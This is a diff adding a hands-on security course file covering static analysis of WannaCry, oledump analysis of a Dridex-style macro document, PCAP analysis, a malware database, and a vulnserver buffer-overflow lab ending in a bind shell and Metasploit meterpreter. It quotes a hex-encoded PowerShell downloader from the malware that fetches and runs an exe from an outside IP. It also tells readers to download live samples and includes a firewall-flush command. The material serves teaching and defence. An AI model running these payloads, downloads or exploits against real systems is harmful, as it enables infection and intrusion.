@@ -1,0 +1,2126 @@
+############################
+# Setup your CentOS 7 host #
+############################
+yum update
+yum install -y nmap python2-scapy.noarch python34-scapy.noarch whois.x86_64 tcpdump.x86_64 unzip wget tcpflow.x86_64 
+
+
+
+################
+# The Scenario #
+################
+You've come across a file that has been flagged by one of your security products (AV Quarantine, HIPS, Spam Filter, Web Proxy, or digital forensics scripts).
+ 
+ 
+The fastest thing you can do is perform static analysis.
+ 
+ 
+ 
+###################
+# Static Analysis #
+###################
+ 
+- After logging please open a terminal window and type the following commands:
+ 
+ 
+---------------------------Type This-----------------------------------
+mkdir malware_analysis
+
+cd malware_analysis
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/wannacry.zip
+ 
+unzip wannacry.zip
+     infected
+ 
+file wannacry.exe
+ 
+mv wannacry.exe malware.pdf
+ 
+file malware.pdf
+ 
+mv malware.pdf wannacry.exe
+ 
+hexdump -n 2 -C wannacry.exe
+ 
+----------------------------------------------------------------------
+ 
+ 
+***What is '4d 5a' or 'MZ'***
+Reference:
+http://www.garykessler.net/library/file_sigs.html
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+objdump -x wannacry.exe
+ 
+strings wannacry.exe
+ 
+strings --all wannacry.exe | head -n 6
+ 
+strings wannacry.exe | grep -i dll
+ 
+strings wannacry.exe | grep -i library
+ 
+strings wannacry.exe | grep -i reg
+ 
+strings wannacry.exe | grep -i key
+ 
+strings wannacry.exe | grep -i rsa
+ 
+strings wannacry.exe | grep -i open
+ 
+strings wannacry.exe | grep -i get
+ 
+strings wannacry.exe | grep -i mutex
+ 
+strings wannacry.exe | grep -i irc
+ 
+strings wannacry.exe | grep -i join        
+ 
+strings wannacry.exe | grep -i admin
+ 
+strings wannacry.exe | grep -i list
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Hmmmmm.......what's the latest thing in the news - oh yeah "WannaCry"
+ 
+Quick Google search for "wannacry ransomeware analysis"
+ 
+ 
+Reference
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+ 
+- Yara Rule -
+ 
+ 
+Strings:
+$s1 = “Ooops, your files have been encrypted!” wide ascii nocase
+$s2 = “Wanna Decryptor” wide ascii nocase
+$s3 = “.wcry” wide ascii nocase
+$s4 = “WANNACRY” wide ascii nocase
+$s5 = “WANACRY!” wide ascii nocase
+$s7 = “icacls . /grant Everyone:F /T /C /Q” wide ascii nocase
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Ok, let's look for the individual strings
+ 
+ 
+---------------------------Type This-----------------------------------
+strings wannacry.exe | grep -i ooops
+ 
+strings wannacry.exe | grep -i wanna
+ 
+strings wannacry.exe | grep -i wcry
+ 
+strings wannacry.exe | grep -i wannacry
+ 
+strings wannacry.exe | grep -i wanacry          **** Matches $s5, hmmm.....
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+####################################
+# Tired of GREP - let's try Python #
+####################################
+Decided to make my own script for this kind of stuff in the future. I
+ 
+Reference1:
+https://s3.amazonaws.com/infosecaddictsfiles/analyse_malware.py
+ 
+This is a really good script for the basics of static analysis
+ 
+Reference:
+https://joesecurity.org/reports/report-db349b97c37d22f5ea1d1841e3c89eb4.html
+ 
+ 
+This is really good for showing some good signatures to add to the Python script
+ 
+ 
+Here is my own script using the signatures (started this yesterday, but still needs work):
+https://pastebin.com/guxzCBmP
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+wget https://files.pythonhosted.org/packages/ed/cc/157f20038a80b6a9988abc06c11a4959be8305a0d33b6d21a134127092d4/pefile-2018.8.8.tar.gz
+tar -zxvf pefile-2018.8.8.tar.gz
+cd pefile-2018.8.8
+python setup.py install
+cd ..
+ 
+ 
+ 
+wget https://pastebin.com/raw/guxzCBmP
+ 
+ 
+mv guxzCBmP am.py
+ 
+ 
+vi am.py
+ 
+python am.py wannacry.exe
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+#####################################################
+# Analyzing Macro Embedded Malware                  #
+# Reference:                                        #
+# https://jon.glass/analyzes-dridex-malware-p1/     #
+#####################################################
+---------------------------Type This-----------------------------------
+yum -y install epel-release
+yum -y install python-pip
+pip install -U olefile
+    
+ 
+mkdir oledump
+ 
+cd oledump
+ 
+wget http://didierstevens.com/files/software/oledump_V0_0_22.zip
+ 
+unzip oledump_V0_0_22.zip
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/064016.zip
+ 
+unzip 064016.zip
+     infected
+ 
+python oledump.py 064016.doc
+ 
+python oledump.py 064016.doc -s A4 -v
+ -----------------------------------------------------------------------
+ 
+ 
+ 
+- From this we can see this Word doc contains an embedded file called editdata.mso which contains seven data streams.
+- Three of the data streams are flagged as macros: A3:’VBA/Module1′, A4:’VBA/Module2′, A5:’VBA/ThisDocument’.
+ 
+---------------------------Type This-----------------------------------
+python oledump.py 064016.doc -s A5 -v
+-----------------------------------------------------------------------
+ 
+- As far as I can tell, VBA/Module2 does absolutely nothing. These are nonsensical functions designed to confuse heuristic scanners.
+ 
+---------------------------Type This-----------------------------------
+python oledump.py 064016.doc -s A3 -v
+ 
+- Look for "GVhkjbjv" and you should see:
+ 
+636D64202F4B20706F7765727368656C6C2E657865202D457865637574696F6E506F6C69637920627970617373202D6E6F70726F66696C6520284E65772D4F626A6563742053797374656D2E4E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F36322E37362E34312E31352F6173616C742F617373612E657865272C272554454D50255C4A494F696F646668696F49482E63616227293B20657870616E64202554454D50255C4A494F696F646668696F49482E636162202554454D50255C4A494F696F646668696F49482E6578653B207374617274202554454D50255C4A494F696F646668696F49482E6578653B
+ 
+- Take that long blob that starts with 636D and finishes with 653B and paste it in:
+http://www.rapidtables.com/convert/number/hex-to-ascii.htm
+
+
+
+----------------------------------------------------------------------------------------------------------------------------
+##################################
+# PCAP Analysis with ChaosReader #
+# Note: run as regular user      #
+##################################
+---------------------------Type This-----------------------------------
+cd ~
+ 
+mkdir -p pcap_analysis/chaos_reader/
+ 
+cd ~/pcap_analysis/chaos_reader/
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/suspicious-time.pcap
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/chaosreader.pl
+ 
+perl chaosreader.pl suspicious-time.pcap
+ 
+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)"
+ 
+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)" | awk '{print $4, $5, $6}' | sort | uniq -c | sort -nr
+ 
+ 
+for i in session_00[0-9]*.http.html; do srcip=`cat "$i" | grep 'http:\ ' | awk '{print $2}' |  cut -d ':' -f1`; dstip=`cat "$i" | grep 'http:\ ' | awk '{print $4}' |  cut -d ':' -f1`; host=`cat "$i" | grep 'Host:\ ' | sort -u | sed -e 's/Host:\ //g'`; echo "$srcip --> $dstip = $host";  done | sort -u
+ 
+/sbin/iptables -F
+
+python -m SimpleHTTPServer    
+          ****** Open a web browser and browse the the IP address of your Linux machine port 8000 for the web page *****
+ 
+------------------------------------------------------------------------
+########################### 
+# Setting up your machine #
+########################### 
+
+---------------------------Type This-----------------------------------
+yum -y groupinstall 'Development Tools'
+yum install -y libpcap-devel.i686 libpcap-devel.x86_64 libpcap.i686 libpcap.x86_64 pcapy.x86_64 p0f.x86_64 perl tcpdump python-docutils git gcc pcre-devel.i686 pcre-devel.x86_64 glibc-static
+
+cd ~/pcap_analysis/
+git clone git://github.com/gamelinux/prads.git
+cd prads
+make
+make install
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/suspicious-time.pcap
+ 
+prads -r suspicious-time.pcap -l prads-asset.log
+ 
+cat prads-asset.log | less
+------------------------------------------------------------------------
+
+###############################
+# Creating a Malware Database #
+###############################
+Creating a malware database (mysql)
+-----------------------------------
+- Step 1: Installing MySQL database
+- Run the following command in the terminal:
+---------------------------Type This-----------------------------------
+yum install -y mariadb-server MySQL-python.x86_64 mysql-connector-python.noarch python2-PyMySQL.noarch mariadb.x86_64 mariadb-devel.x86_64 mariadb-libs.x86_64
+------------------------------------------------------------------------
+     
+- Step 2: Configure the database to accept large files by adding 'max_allowed_packet = 16M' to the /etc/my.cnf file
+---------------------------Type This-----------------------------------
+vi /etc/my.cnf
+max_allowed_packet = 16M
+------------------------------------------------------------------------
+
+Step 3: Start MariaDB
+- Run the following command in the terminal:
+---------------------------Type This-----------------------------------
+systemctl enable mariadb
+systemctl start mariadb
+------------------------------------------------------------------------
+ 
+Step 4: Logging in
+Run the following command in the terminal:
+---------------------------Type This-----------------------------------
+mysql -u root -p                    (set a password of 'malware')
+ 
+use mysql;
+update user SET PASSWORD=PASSWORD("malware") WHERE USER='root';
+flush privileges;
+create database malware;
+grant all on malware.* to 'root' identified by 'malware';
+exit;
+------------------------------------------------------------------------
+
+
+
+Step 5: Configure the database setup script
+---------------------------Type This----------------------------------- 
+wget https://raw.githubusercontent.com/dcmorton/MalwareTools/master/mal_to_db.py
+ 
+vi mal_to_db.py                     (fill in database connection information)
+ 
+python mal_to_db.py -i
+------------------------------------------------------------------------
+
+ 
+Step 6: check it to see if the files table was created
+--------------------------Type This----------------------------------- 
+mysql -u root -p
+    malware
+ 
+show databases;
+ 
+use malware;
+ 
+show tables;
+ 
+describe files;
+ 
+exit;
+ 
+---------------------------------
+ 
+ 
+Step 7:  Now add the malicious file to the DB
+---------------------------Type This-----------------------------------
+wget https://s3.amazonaws.com/infosecaddictsfiles/wannacry.zip
+ 
+unzip wannacry.zip
+     infected
+
+python mal_to_db.py -f wannacry.exe -u
+------------------------------------------------------------------------ 
+ 
+ 
+Step 8: Now check to see if it is in the DB
+---------------------------Type This-----------------------------------
+mysql -u root -p
+    malware
+ 
+mysql> use malware;
+ 
+select id,md5,sha1,sha256,time FROM files;
+ 
+mysql> quit;
+------------------------------------------------------------------------
+
+
+-------------------------------------------------
+1. App Type
+    - Stand Alone
+    - Client Server     (***vulnserver.exe***)
+    - Web App
+ 
+2. Input Type
+    - Stand Alone       File/Keyboard/Mouse
+    - Client Server     Logical network port        (***9999***)
+    - Web App       Browser
+ 
+ 
+3. Map and fuzz app entry points
+    - Commands, Methods, Verbs, functions, controllers, subroutines
+    TRUN 2100
+ 
+4. Isolate the crash
+    EIP = 39 6F 43 38
+           9  o C   8
+ 
+5. Calculate distance to EIP
+    2006
+ 
+6. Redirect code execution to mem location you control
+ 
+7. Insert payload (shellcode)
+--------------------------------------------------------------
+
+
+
+
+                            #######################
+----------------------------# Exploit Development #----------------------------
+                            #######################
+ 
+ 
+ 
+#######################
+# VMs for this course #
+#######################
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/Win7x64.zip
+    username: workshop
+    password: password
+   
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/InfoSecAddictsVM.zip
+user:      infosecaddicts
+pass:      infosecaddicts
+ 
+You don't have to, but you can do the updates in the Win7 VM (yes, it is a lot of updates).
+ 
+ 
+ 
+ 
+ 
+#######################################################
+# Files you may find helpful for learning Exploit Dev #
+#######################################################
+https://s3.amazonaws.com/secureninja/files/ExploitDevProcessDocs.zip
+ 
+ 
+ 
+ 
+ 
+#####################################
+# Quick Stack Based Buffer Overflow #
+#####################################
+ 
+- You can download everything you need for this exercise from the links below (copy nc.exe into the c:\windows\system32 directory)
+https://s3.amazonaws.com/infosecaddictsfiles/ExploitLab.zip
+https://s3.amazonaws.com/infosecaddictsfiles/nc.exe
+
+ 
+- Extract the ExploitLab.zip file to your Desktop
+ 
+- Go to folder C:\Users\student\Desktop\ExploitLab\2-VulnServer, and run vulnserv.exe
+ 
+- Open a new command prompt and type:
+ 
+---------------------------Type This-----------------------------------
+ 
+nc localhost 9999
+--------------------------------------------------------------------------
+ 
+- In the new command prompt window where you ran nc type:
+HELP
+ 
+- Go to folder C:\Users\student\Desktop\ExploitLab\4-AttackScripts
+- Right-click on 1-simplefuzzer.py and choose the option edit with notepad++
+ 
+- Now double-click on 1-simplefuzzer.py
+- You'll notice that vulnserv.exe crashes. Be sure to note what command and the number of As it crashed on.
+ 
+ 
+- Restart vulnserv, and run 1-simplefuzzer.py again. Be sure to note what command and the number of As it crashed on.
+ 
+- Now go to folder C:\Users\student\Desktop\ExploitLab\3-OllyDBG and start OllyDBG. Choose 'File' -> 'Attach' and attach to process vulnserv.exe
+ 
+- Go back to folder C:\Users\student\Desktop\ExploitLab\4-AttackScripts and double-click on 1-simplefuzzer.py.
+ 
+- Take note of the registers (EAX, ESP, EBP, EIP) that have been overwritten with As (41s).
+ 
+- Now isolate the crash by restarting your debugger and running script 2-3000chars.py
+ 
+- Calculate the distance to EIP by running script 3-3000chars.py
+- This script sends 3000 nonrepeating chars to vulserv.exe and populates EIP with the value: 396F4338
+ 
+4-count-chars-to-EIP.py
+- In the previous script we see that EIP is overwritten with 396F4338 is 8 (38), C (43), o (6F), 9 (39)
+- so we search for 8Co9 in the string of nonrepeating chars and count the distance to it
+ 
+5-2006char-eip-check.py
+- In this script we check to see if our math is correct in our calculation of the distance to EIP by overwriting EIP with 42424242
+ 
+6-jmp-esp.py
+- In this script we overwrite EIP with a JMP ESP (6250AF11) inside of essfunc.dll
+ 
+7-first-exploit
+- In this script we actually do the stack overflow and launch a bind shell on port 4444
+ 
+8 - Take a look at the file vulnserv.rb and place it in your Ubuntu host via SCP or copy it and paste the code into the host.
+ 
+ 
+------------------------------
+ 
+---------------------------Type This-----------------------------------
+ 
+ 
+cd /home/infosecaddicts/toolz/metasploit/modules/exploits/windows/misc
+ 
+vi vulnserv.rb    (paste the code into this file)
+ 
+ 
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+ 
+ 
+use exploit/windows/misc/vulnserv
+set PAYLOAD windows/meterpreter/bind_tcp
+set RHOST CHANGEME-TO-YOUR-WIN7-IP
+set RPORT 9999
+exploit
+-----------------------------------------------------------------------
+ 
+#########################################
+# FreeFloat FTP Server Exploit Analysis #
+#########################################
+ 
+ 
+ 
+Analyze the following exploit code:
+https://www.exploit-db.com/exploits/15689/
+ 
+1. What is the target platform that this exploit works against?
+2. What is the variable name for the distance to EIP?
+3. What is the actual distance to EIP in bytes?
+4. Describe what is happening in the variable ‘junk2’
+ 
+ 
+ 
+ 
+Analysis of the training walk-through based on EID: 15689:
+https://s3.amazonaws.com/infosecaddictsfiles/ff.zip
+ 
+ 
+ 
+ 
+ff1.py
+1. What does the sys module do? Call System Commands
+2. What is sys.argv[1] and sys.argv[2]?
+3. What application entry point is being attacked in this script?
+ 
+ 
+ 
+ff2.py
+1. Explain what is happening in lines 18 - 20 doing.
+2. What pattern_create.rb doing and where can I find it?
+3. Why can’t I just double click the file to run this script?
+ 
+ 
+ 
+ff3.py
+1. Explain what is happening in lines 17 - to 25?
+2. Explain what is happening in lines 30 - to 32?
+3. Why is everything below line 35 commented out?
+ 
+ 
+ 
+ff4.py
+1. Explain what is happening in lines 13 - to 15.
+2. Explain what is happening in line 19.
+3. Why is everything below line 35 commented out?
+ 
+ 
+ 
+Ff5.py
+1. Explain what is happening in line 15.
+2. What is struct.pack?
+3. How big is the shellcode in this script?
+ 
+ 
+ 
+ff6.py
+1. What is the distance to EIP?
+2. How big is the shellcode in this script?
+3. What is the total byte length of the data being sent to this app?
+ 
+ 
+ 
+ 
+ff7.py
+1. What is a tuple in python?
+2. How big is the shellcode in this script?
+3. Did your app crash in from this script?
+ 
+ 
+ 
+ 
+ff8.py
+1. How big is the shellcode in this script?
+2. What is try/except in python?
+3. What is socket.SOCK_STREAM in Python?
+ 
+ 
+ 
+ff9.py
+1. What is going on in lines 19 and 20?
+2. What is the length of the NOPs?
+3. What is socket.SOCK_STREAM in Python?
+ 
+ 
+ 
+ 
+ff010.py
+1. What is going on in lines 18 - 20?
+2. What is going on in lines 29 - 32?
+3. How would a stack adjustment help this script?
+
+
+
+
+
+
+
+#################################
+# Scripts to install Metasploit #
+#################################
+
+
+-----------------1st script-------------------------------
+#!/bin/bash
+# Setup CentOS 7 for Metasploit
+####################################
+# Ensure script is running as root #
+####################################
+if [[ $EUID -ne 0 ]]; then
+   echo "This script must be run as root"
+   exit 1
+fi
+ 
+ 
+##########################
+# Set up the CentOS host #
+##########################
+yum update
+yum -y groupinstall 'Development Tools'
+yum install -y libpcap-devel.i686 libpcap-devel.x86_64 libpcap.i686 libpcap.x86_64 pcapy.x86_64 p0f.x86_64 perl tcpdump python-docutils git gcc pcre-devel.i686 pcre-devel.x86_64 glibc-static nmap python2-scapy.noarch python34-scapy.noarch whois.x86_64 tcpdump.x86_64 unzip wget tcpflow.x86_64 sqlite rubygem-sqlite3 ruby-irb rubygems rubygem-bigdecimal rubygem-rake rubygem-i18n rubygem-bundler ruby-devel libpcap-devel git svn postgresql-server postgresql-devel sqlite-devel git-core zlib zlib-devel gcc-c++ patch readline readline-devel libyaml-devel libffi-devel openssl-devel make bzip2 autoconf automake libtool bison curl sqlite-devel
+yum -y install epel-release
+yum -y install python-pip
+pip install -U olefile
+yum install yum-utils -y
+cd /usr/local/
+rm -rf rvm/
+yum-builddep -y ruby
+gpg2 --keyserver hkp://keys.gnupg.net --recv-keys
+command curl -sSL https://rvm.io/mpapis.asc | gpg2 --import -
+curl -L get.rvm.io | bash -s stable
+source /etc/profile.d/rvm.sh
+chmod -R 777 /usr/local/rvm/
+rvm install "ruby-2.5.1"
+gem install rails
+bundle install
+ 
+-------------------------2nd script-----user script-----------------------------------------------------------------------
+ 
+ 
+#!/bin/bash
+ 
+# Setup CentOS 7 for Metasploit
+########################################
+# Ensure script is NOT running as root #
+########################################
+if [ $UID -eq 0 ] ; then
+   echo "This script must NOT be run as root"
+   echo "Make sure you are a regular user in your home directory when you run this script"
+   exit 1
+fi
+ 
+ 
+cd ~
+rm -rf .rvm/
+rm -rf metasploit-framework/
+git clone git://github.com/rapid7/metasploit-framework.git
+cd metasploit-framework/
+gpg2 --keyserver hkp://keys.gnupg.net --recv-keys
+command curl -sSL https://rvm.io/mpapis.asc | gpg2 --import -
+cd metasploit-framework/
+curl -L get.rvm.io | bash -s stable
+cd metasploit-framework/
+source /etc/profile.d/rvm.sh
+rvm install "ruby-2.5.1"
+gem install rails
+gem install rake
+gem install rex-ole
+bundle install
+./msfconsole
+
+
+-------------------------------------------------------------------------------------------------------------
+
+############################
+# Day 3: Ruby Fundamentals #
+############################
+ 
+ 
+ 
+- Ruby is a general-purpose, object-oriented programming language, which was created by Yukihiro Matsumoto, a computer
+scientist and programmer from Japan. It is a cross-platform dynamic language.
+ 
+- The major implementations of this language are Ruby MRI, JRuby, HotRuby, IronRuby, MacRuby, etc. Ruby
+on Rails is a framework that is written in Ruby.
+ 
+- Ruby's file name extensions are .rb and .rbw.
+ 
+- official website of this
+ 
+- language: www.ruby-lang.org.
+ 
+ 
+- interactive Shell called Ruby Shell
+ 
+ 
+- Installing and Running IRB
+ 
+---------------------------Type This-----------------------------------
+ruby -v
+-----------------------------------------------------------------------
+ 
+ 
+If you don't have ruby2.3 use the commands below:
+-----------------------------------------------------------------------
+sudo apt-get install ruby2.3 ruby2.3-dev ruby2.3-doc irb rdoc ri
+-----------------------------------------------------------------------
+ 
+- open up the interactive console and play around.
+ 
+---------------------------Type This-----------------------------------
+irb
+-----------------------------------------------------------------------
+ 
+ 
+- Math, Variables, Classes, Creating Objects and Inheritance
+ 
+ 
+The following arithmetic operators:
+    Addition operator (+) — 10 + 23
+    Subtraction operator (-) — 1001 - 34
+    Multiplication operator (*) — 5 * 5
+    Division operator (/) — 12 / 2
+ 
+ 
+ 
+- Now let's cover some variable techniques. In Ruby, you can assign a value to a variable using the assignment
+operator. '=' is the assignment operator. In the following example, 25 is assigned to x. Then x is incremented by
+30. Again, 69 is assigned to y, and then y is incremented by 33.
+ 
+---------------------------Type This-----------------------------------
+x = 25
+x + 30
+y = 69
+y+33
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Let's look at creating classes and creating objects.
+ 
+- Here, the name of the class is Attack. An object has its properties and methods.
+ 
+ 
+---------------------------Type This-----------------------------------
+class Attack
+attr_accessor :of, :sqli, :xss
+end
+-----------------------------------------------------------------------
+ 
+ 
+What is nil?
+Reference:
+https://www.codecademy.com/en/forum_questions/52a112378c1cccb0f6001638
+ 
+nil is the Ruby object that represents nothingness. Whenever a method doesn’t return a useful value, it returns nil. puts and print are methods that return nil:
+ 
+Since the Ruby Console always shows the value of the last statement or expression in your code, if that last statement is print, you’ll see the nil.
+ 
+To prevent the nil from "sticking" to the output of print (which doesn’t insert a line break), you can print a line break after it, and optionally put some other value as the last statement of your code, then the Console will show it instead of nil:
+ 
+ 
+ 
+ 
+ 
+# Now that we have created the classes let's create the objects
+---------------------------Type This-----------------------------------
+first_attack = Attack.new
+first_attack.of = "stack"
+first_attack.sqli = "blind"
+first_attack.xss = "dom"
+puts first_attack.of
+puts first_attack.sqli
+puts first_attack.xss
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- Let's work on some inheritance that will help make your programming life easier. When we have multiple classes,
+inheritance becomes useful. In simple words, inheritance is the classification of classes. It is a process by which
+one object can access the properties/attributes of another object of a different class. Inheritance makes your
+programming life easier by maximizing code reuse.
+ 
+ 
+---------------------------Type This-----------------------------------
+class Exploitframeworks
+attr_accessor :scanners, :exploits, :shellcode, :postmodules
+end
+class Metasploit < Exploitframeworks
+end
+class Canvas < Exploitframeworks
+end
+class Coreimpact < Exploitframeworks
+end
+class Saint < Exploitframeworks
+end
+class Exploitpack < Exploitframeworks
+end
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- Methods, More Objects, Arguments, String Functions and Expression Shortcuts
+ 
+- Let's create a simple method. A method is used to perform an action and is generally called with an object.
+ 
+- Here, the name of the method is 'learning'. This method is defined inside the Msfnl class. When it is called,
+it will print this string: "We are Learning how to PenTest"
+ 
+- An object named 'bo' is created, which is used to call the method.
+ 
+ 
+---------------------------Type This-----------------------------------
+class Msfnl
+def learning
+puts "We are Learning how to PenTest"
+end
+end
+-----------------------------------------------------------------------
+ 
+#Now let's define an object for our Method
+ 
+---------------------------Type This-----------------------------------
+joe = Msfnl.new
+joe.learning
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- An argument is a value or variable that is passed to the function while calling it. In the following example, while
+calling the puts() function, we are sending a string value to the function. This string value is used by the
+function to perform some particular operations.
+ 
+puts ("Pentesting")
+ 
+ 
+- There are many useful string functions in Ruby. String functions make it easy to work with strings. Now, we will
+explain some useful string functions with an example.
+ 
+- The length function calculates the length of a string. The upcase function converts a string to uppercase. And the
+reverse function reverses a string. The following example demonstrates how to use the string functions.
+ 
+---------------------------Type This-----------------------------------
+55.class
+"I Love Programming".class
+"I Love Pentesting".length
+"Pown that box".upcase
+"Love" + "To Root Boxes"
+"evil".reverse
+"evil".reverse.upcase
+-----------------------------------------------------------------------
+ 
+ 
+-  expressions and shortcuts. In the below example, 'a' is an operand, '3' is an operand,  '=' is
+an operator, and 'a=3' is the expression. A statement consists of one or multiple expressions. Following are the
+examples of some expressions.
+ 
+---------------------------Type This-----------------------------------
+a = 3
+b = 6
+a+b+20
+d = 44
+f = d
+puts f
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+- shortcuts. +=, *= are the shortcuts. These operators are also called abbreviated
+assignment operators. Use the shortcuts to get the effect of two statements in just one. Consider the following
+statements to understand the shortcuts.
+ 
+---------------------------Type This-----------------------------------
+g = 70
+g = g+44
+g += 33
+-----------------------------------------------------------------------
+ 
+ 
+- In the above statement, g is incremented by 33 and then the total value is assigned to g.
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+g *= 3
+-----------------------------------------------------------------------
+ 
+ 
+- In the above statement, g is multiplied with 3 and then assigned to g.
+ 
+- Example
+ 
+- Comparison Operators, Loops, Data Types, and Constants
+ 
+- Comparison operators are used for comparing one variable or constant with another variable or constant. We will show
+how to use the following comparison operators.
+ 
+'Less than' operator (<): This operator is used to check whether a variable or constant is less than another
+variable or constant. If it's less than the other, the 'less than' operator returns true.
+ 
+'Equal to' operator (==): This operator is used to check whether a variable or constant is equal to another variable
+or constant. If it's equal to the other, the 'equal to' operator returns true.
+ 
+'Not equal to' operator (!=): This operator is used to check whether a variable or constant is not equal to another
+variable or constant. If it's not equal to the other, the 'not equal to' operator returns true.
+ 
+---------------------------Type This-----------------------------------
+numberofports = 55
+puts "number of ports found during scan" if numberofports < 300
+numberofports = 400
+puts "number of ports found during scan" if numberofports < 300
+puts "number of ports found during scan" if numberofports == 300
+puts "number of ports found during scan" if numberofports != 300
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Example
+ 
+ 
+- the 'OR' operator and the 'unless' keyword. This symbol '||' represents the logical 'OR' operator.
+ 
+- This operator is generally used to combine multiple conditions.
+- In case of two conditions, if both or any of the conditions is true, the 'OR'operator returns true. Consider the
+ 
+- following example to understand how this operator works.
+ 
+---------------------------Type This-----------------------------------
+ports = 100
+puts "number of ports found on the network" if ports<100 || ports>200
+puts "number of ports found on the network" if ports<100 || ports>75
+-----------------------------------------------------------------------
+ 
+# unless
+ 
+---------------------------Type This-----------------------------------
+portsbelow1024 = 50
+puts "If the ports are below 1024" unless portsbelow1024 < 1000
+puts "If the ports are below 1024" unless portsbelow1024 < 1055
+puts "If the ports are below 1024" unless portsbelow1024 < 20
+-----------------------------------------------------------------------
+ 
+- The 'unless' keyword is used to do something programmatically unless a condition is true.
+ 
+ 
+ 
+- Loops are used to execute statement(s) repeatedly. Suppose you want to print a string 10 times.
+ 
+- See the following example to understand how a string is printed 10 times on the screen using a loop.
+ 
+---------------------------Type This-----------------------------------
+10.times do puts "infosecaddicts" end
+-----------------------------------------------------------------------
+ 
+# Or use the curly braces
+ 
+---------------------------Type This-----------------------------------
+10.times {puts "infosecaddicts"}
+-----------------------------------------------------------------------
+ 
+ 
+- Changing Data Types: Data type conversion is an important concept in Ruby because it gives you flexibility while
+working with different data types. Data type conversion is also known as type casting.
+ 
+ 
+ 
+- Constants: Unlike variables, the values of constants remain fixed during the program interpretation. So if you
+change the value of a constant, you will see a warning message.
+ 
+ 
+ 
+ 
+- Multiple Line String Variable, Interpolation, and Regular Expressions
+ 
+- A multiple line string variable lets you assign the value to the string variable through multiple lines.
+ 
+---------------------------Type This-----------------------------------
+infosecaddicts = <<mark
+welcome
+to the
+best
+metasploit
+course
+on the
+market
+mark
+puts infosecaddicts
+-----------------------------------------------------------------------
+ 
+ 
+- Interpolation lets you evaluate any placeholder within a string, and the placeholder is replaced with the value that
+it represents. So whatever you write inside #{ } will be evaluated and the value will be replaced at that position.
+Examine the following example to understand how interpolation works in Ruby.
+ 
+References:
+https://stackoverflow.com/questions/10869264/meaning-of-in-ruby
+ 
+ 
+---------------------------Type This-----------------------------------
+a = 4
+b = 6
+puts "a * b = a*b"
+puts " #{a} * #{b} = #{a*b} "
+person = "Joe McCray"
+puts "IT Security consultant person"
+puts "IT Security consultant #{person}"
+-----------------------------------------------------------------------
+ 
+- Notice that the placeholders inside #{ } are evaluated and they are replaced with their values.
+ 
+ 
+ 
+ 
+ 
+- Character classes
+---------------------------Type This-----------------------------------
+infosecaddicts = "I Scanned 45 hosts and found 500 vulnerabilities"
+"I love metasploit and what it has to offer!".scan(/[lma]/) {|y| puts y}
+"I love metasploit and what it has to offer!".scan(/[a-m]/) {|y| puts y}
+-----------------------------------------------------------------------
+ 
+ 
+- Arrays, Push and Pop, and Hashes
+ 
+ 
+- In the following example, numbers is an array that holds 6 integer numbers.
+ 
+ 
+---------------------------Type This-----------------------------------
+numbers = [2,4,6,8,10,100]
+puts numbers[0]
+puts numbers[4]
+numbers[2] = 150
+puts numbers
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Now we will show how you can implement a stack using an array in Ruby. A stack has two operations - push and pop.
+ 
+ 
+---------------------------Type This-----------------------------------
+framework = []
+framework << "modules"
+framework << "exploits"
+framework << "payloads"
+framework.pop
+framework.shift
+-----------------------------------------------------------------------
+ 
+- Hash is a collection of elements, which is like the associative array in other languages. Each element has a key
+that is used to access the element.
+ 
+ 
+- Hash is a Ruby object that has its built-in methods. The methods make it easy to work with hashes.
+In this example, 'metasploit' is a hash. 'exploits', 'microsoft', 'Linux' are the keys, and the following are the
+respective values: 'what module should you use', 'Windows XP' and 'SSH'.
+ 
+---------------------------Type This-----------------------------------
+metasploit = {'exploits' => 'what module should you use', 'microsoft' => 'Windows XP', 'Linux' => 'SSH'}
+print metasploit.size
+print metasploit["microsoft"]
+metasploit['microsoft'] = 'redhat'
+print metasploit['microsoft']
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Writing Ruby Scripts
+ 
+ 
+- Let's take a look at one of the ruby modules and see exactly now what it is doing. Now explain to me exactly what
+this program is doing. If we take a look at the ruby program what you find is that it is a TCP port scanner that
+someone made to look for a specific port. The port that it is looking for is port 21 FTP.
+---------------------------Type This-----------------------------------
+cd ~/metasploit-framework/modules/auxiliary/scanner/portscan
+ls
+-----------------------------------------------------------------------
+ 
+ 
+ 
+###########################
+# Metasploit Fundamentals #
+###########################
+ 
+- Let's take a little look at Metasploit Framework
+ 
+- First, we should take note of the different directories, the Modular Architecture.
+ 
+The modules that make up the Modular Architecture are
+Exploits
+Auxiliary
+Payload
+Encoder
+Nops
+ 
+ 
+Important directories to keep in mind for Metasploit, in case we'd like to edit different modules, or add our own,
+ 
+are
+ 
+Modules
+Scripts
+Plugins
+External
+Data
+Tools
+ 
+- Let's take a look inside the Metasploit directory and see what's the
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit
+ls
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Now let's take a look inside the Modules directory and see what's there.
+---------------------------Type This-----------------------------------
+cd ~/metasploit-framework/modules
